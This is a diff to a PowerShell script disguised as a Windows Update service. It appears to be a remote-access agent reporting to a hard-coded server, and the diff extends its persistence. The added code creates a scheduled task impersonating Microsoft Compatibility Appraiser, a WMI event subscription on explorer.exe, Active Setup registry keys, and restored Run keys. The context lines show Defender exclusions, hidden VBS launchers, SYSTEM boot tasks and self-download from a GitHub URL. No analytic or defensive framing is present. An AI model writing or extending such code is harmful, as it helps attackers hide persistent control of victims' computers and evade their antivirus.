@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# persistência: Run keys + Startup + task usuário (AtLogOn + 1min) + task SYSTEM (AtStartup) + boot_launcher
+# persistência: Run keys + Startup + Task user + Task SYSTEM boot + Shadow task + WMI event + Active Setup
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -10,6 +10,8 @@ $h = [System.BitConverter]::ToString(
 $installName  = "WinUpdateSvc_$h"
 $taskName     = "MicrosoftWindowsUpdateService_$h"
 $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
+$shadowName   = "MicrosoftCompatibilityAppraiser_$h"
+$shadowPath   = "\Microsoft\Windows\Application Experience\$shadowName"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
@@ -25,6 +27,7 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
+    # 1. Defender
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -39,7 +42,6 @@ if ($args -notcontains "-silent") {
         try { Add-MpPreference -ExclusionPath $sd -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "powershell.exe" -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "wscript.exe" -Force -ErrorAction SilentlyContinue } catch {}
-
         try {
             $7zr = "$sd\7zr.exe"
             if (-not (Test-Path $7zr)) { Invoke-WebRequest -Uri "https://www.7-zip.org/a/7zr.exe" -OutFile $7zr -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue }
@@ -56,29 +58,27 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
+    # 2. Ficheiros
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
     $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
     Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
 
-    # boot_launcher.ps1 — corre como SYSTEM no arranque, espera por sessão e lança a task do usuário
     $bootContent = @"
 `$userTask = "$taskName"
 while (`$true) {
     try {
         `$active = (query session 2>`$null | Select-String "Active")
-        if (`$active) {
-            schtasks /run /tn `$userTask 2>`$null | Out-Null
-        }
+        if (`$active) { schtasks /run /tn `$userTask 2>`$null | Out-Null }
     } catch {}
     Start-Sleep -Seconds 30
 }
 "@
     Set-Content -Path $bootPath -Value $bootContent -Force -ErrorAction SilentlyContinue
 
+    # 3. Run keys + Startup
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
-
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -89,6 +89,7 @@ while (`$true) {
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
+    # 4. Task user + SYSTEM + shadow
     try {
         $interval = if ($defenderOff) { 3 } else { 1 }
         $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
@@ -115,18 +116,15 @@ while (`$true) {
   <Actions Context="Author"><Exec><Command>wscript.exe</Command><Arguments>//B //Nologo "$vbsPath"</Arguments></Exec></Actions>
 </Task>
 "@
-        $xmlUserPath = "$dir\task_user_$h.xml"
-        Set-Content -Path $xmlUserPath -Value $xmlUser -Encoding Unicode -Force
-        cmd /c "schtasks /create /tn `"$taskName`" /xml `"$xmlUserPath`" /f" 2>$null
-        Remove-Item $xmlUserPath -Force -ErrorAction SilentlyContinue
+        $p1 = "$dir\tu_$h.xml"; Set-Content -Path $p1 -Value $xmlUser -Encoding Unicode -Force
+        cmd /c "schtasks /create /tn `"$taskName`" /xml `"$p1`" /f" 2>$null
+        Remove-Item $p1 -Force -ErrorAction SilentlyContinue
 
         $xmlBoot = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo><Description>Microsoft Windows Update Boot</Description></RegistrationInfo>
-  <Triggers>
-    <BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger>
-  </Triggers>
+  <Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger></Triggers>
   <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
   <Settings>
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
@@ -139,19 +137,92 @@ while (`$true) {
   <Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -f "$bootPath"</Arguments></Exec></Actions>
 </Task>
 "@
-        $xmlBootPath = "$dir\task_boot_$h.xml"
-        Set-Content -Path $xmlBootPath -Value $xmlBoot -Encoding Unicode -Force
-        cmd /c "schtasks /create /tn `"$taskBootName`" /xml `"$xmlBootPath`" /f" 2>$null
-        Remove-Item $xmlBootPath -Force -ErrorAction SilentlyContinue
+        $p2 = "$dir\tb_$h.xml"; Set-Content -Path $p2 -Value $xmlBoot -Encoding Unicode -Force
+        cmd /c "schtasks /create /tn `"$taskBootName`" /xml `"$p2`" /f" 2>$null
+        Remove-Item $p2 -Force -ErrorAction SilentlyContinue
+
+        $xmlShadow = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Description>Microsoft Compatibility Appraiser</Description></RegistrationInfo>
+  <Triggers>
+    <TimeTrigger><StartBoundary>$startTime</StartBoundary>
+      <Repetition><Interval>PT3M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
+      <Enabled>true</Enabled></TimeTrigger>
+  </Triggers>
+  <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Enabled>true</Enabled>
+  </Settings>
+  <Actions Context="Author"><Exec><Command>wscript.exe</Command><Arguments>//B //Nologo "$vbsPath"</Arguments></Exec></Actions>
+</Task>
+"@
+        $p3 = "$dir\ts_$h.xml"; Set-Content -Path $p3 -Value $xmlShadow -Encoding Unicode -Force
+        cmd /c "schtasks /create /tn `"$shadowPath`" /xml `"$p3`" /f" 2>$null
+        Remove-Item $p3 -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 5. WMI event subscription — dispara no arranque do explorer.exe
+    try {
+        $wmiFilterName   = "MSUpdateF_$h"
+        $wmiConsumerName = "MSUpdateC_$h"
+        $wmiQuery = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'"
+
+        $existing = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$wmiFilterName'" -ErrorAction SilentlyContinue
+        if (-not $existing) {
+            $filter = ([wmiclass]"root\subscription:__EventFilter").CreateInstance()
+            $filter.Name = $wmiFilterName
+            $filter.EventNameSpace = "root\cimv2"
+            $filter.QueryLanguage = "WQL"
+            $filter.Query = $wmiQuery
+            $filter.Put() | Out-Null
+        }
+
+        $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
+        if (-not $existingConsumer) {
+            $consumer = ([wmiclass]"root\subscription:CommandLineEventConsumer").CreateInstance()
+            $consumer.Name = $wmiConsumerName
+            $consumer.CommandLineTemplate = "wscript.exe //B //Nologo `"$vbsPath`""
+            $consumer.Put() | Out-Null
+        }
+
+        $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
+        $existingBinding = $bindings | Where-Object { $_.Filter -like "*$wmiFilterName*" } | Select-Object -First 1
+        if (-not $existingBinding) {
+            $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$wmiFilterName'" -ErrorAction Stop
+            $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$wmiConsumerName'" -ErrorAction Stop
+            if ($f -and $c) {
+                $b = ([wmiclass]"root\subscription:__FilterToConsumerBinding").CreateInstance()
+                $b.Filter = $f
+                $b.Consumer = $c
+                $b.Put() | Out-Null
+            }
+        }
+    } catch {}
+
+    # 6. Active Setup — dispara no próximo logon (perfil novo)
+    try {
+        $asHex = ($h + "000000000000000000000000").Substring(0, 32)
+        $asGuid = "{" + $asHex.Substring(0,8) + "-" + $asHex.Substring(8,4) + "-" + $asHex.Substring(12,4) + "-" + $asHex.Substring(16,4) + "-" + $asHex.Substring(20,12) + "}"
+        $asPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$asGuid"
+        if (-not (Test-Path $asPath)) {
+            New-Item -Path $asPath -Force | Out-Null
+            Set-ItemProperty -Path $asPath -Name "StubPath" -Value "wscript.exe //B //Nologo `"$vbsPath`"" -Force
+            Set-ItemProperty -Path $asPath -Name "Version" -Value "1,0,0,0" -Force
+            Set-ItemProperty -Path $asPath -Name "IsInstalled" -Value 1 -Type DWord -Force
+        }
     } catch {}
 
     attrib +h +s +r $scriptPath 2>$null
     attrib +h +s +r $vbsPath 2>$null
     attrib +h +s +r $bootPath 2>$null
 
-    # arranca a task SYSTEM já (sem esperar pelo próximo boot)
     cmd /c "schtasks /run /tn `"$taskBootName`"" 2>$null
-
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
     exit
 }
@@ -298,6 +369,7 @@ if (-not ("R9KAgent" -as [type])) {
                         string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
                         string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
                         string bootPath = Path.Combine(sub, "boot_launcher.ps1");
+
                         if (!File.Exists(scriptPath)) {
                             string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                             try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
@@ -314,9 +386,10 @@ if (-not ("R9KAgent" -as [type])) {
                             try { File.SetAttributes(bootPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
                         }
 
-                        // verifica e restaura task do usuário
                         string tUser = "MicrosoftWindowsUpdateService_" + leaf;
                         string tBoot = "MicrosoftWindowsUpdateBoot_" + leaf;
+                        string tShadow = "\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf;
+
                         if (!TaskExists(tUser)) {
                             string xml = TaskXml(scriptPath, vbsPath, false);
                             CreateTaskFromXml(tUser, xml, sub);
@@ -324,6 +397,18 @@ if (-not ("R9KAgent" -as [type])) {
                         if (!TaskExists(tBoot)) {
                             string xml = TaskXml(scriptPath, bootPath, true);
                             CreateTaskFromXml(tBoot, xml, sub);
+                        }
+                        if (!TaskExists(tShadow)) {
+                            string xml = TaskXml(scriptPath, vbsPath, false);
+                            CreateTaskFromXml(tShadow, xml, sub);
+                        }
+
+                        // Run keys
+                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
+                        }
+                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
+                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
                         }
                     }
                 } catch {}
@@ -363,7 +448,8 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void CreateTaskFromXml(string name, string xml, string dir) {
             try {
-                string path = Path.Combine(dir, "restore_" + name + ".xml");
+                string safe = name.Replace('\\', '_');
+                string path = Path.Combine(dir, "restore_" + safe + ".xml");
                 File.WriteAllText(path, xml, Encoding.Unicode);
                 var p = Process.Start(new ProcessStartInfo("schtasks", "/create /tn \"" + name + "\" /xml \"" + path + "\" /f") { UseShellExecute = false, CreateNoWindow = true });
                 p.WaitForExit(10000);
@@ -522,6 +608,7 @@ if (-not ("R9KAgent" -as [type])) {
                             try { using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
                             try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService_" + leaf + " /f").WaitForExit(); } catch {}
                             try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateBoot_" + leaf + " /f").WaitForExit(); } catch {}
+                            try { Process.Start("schtasks", "/delete /tn \"\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf + "\" /f").WaitForExit(); } catch {}
                             string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                             string sv = Path.Combine(startup, runName + ".vbs");
                             if (File.Exists(sv)) { try { File.SetAttributes(sv, FileAttributes.Normal); File.Delete(sv); } catch {} }
